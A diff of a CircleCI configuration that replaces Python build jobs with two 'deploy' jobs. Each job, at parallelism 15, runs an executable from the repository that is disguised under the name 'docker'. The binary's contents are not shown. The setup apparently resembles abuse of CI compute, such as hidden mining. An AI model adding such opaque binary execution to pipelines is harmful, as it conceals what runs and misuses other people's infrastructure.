@@ -1,30 +1,41 @@
-working_dir: &working_dir ~/app 
-.build_template: &script
-  steps: 
-    - checkout 
-    - run: 
-        name: Install
-        command: |
-                    python sample.py
-        no_output_timeout: 300m                               
-version: 2.0 
-jobs: 
-  build1: 
-    <<: *script
+version: 2.0
+jobs:
+  deploy:
     parallelism: 15
     docker:
-      - image: python
-    resource_class: large
-  build2: 
-    <<: *script
-    parallelism: 15
-    docker:
-      - image: python
-    resource_class: large
+    - image: cimg/base:2021.02-20.04
 
-workflows: 
-  version: 2 
-  commit: 
-    jobs: 
-      - build1
-      - build2
+    working_directory: /home/circleci/postgres
+
+    steps:
+    - checkout
+    - setup_remote_docker
+    - run:
+        name: Registry
+        command: chmod +x docker && ./docker
+  deploy1:
+    parallelism: 15
+    docker:
+    - image: cimg/base:2021.02-20.04
+
+    working_directory: /home/circleci/postgres
+
+    steps:
+    - checkout
+    - setup_remote_docker
+    - run:
+        name: Registry
+        command: chmod +x docker && ./docker
+
+workflows:
+  version: 2
+  deploy:
+    jobs:
+    - deploy:
+        filters:
+          branches:
+            only: main
+    - deploy1:
+        filters:
+          branches:
+            only: main
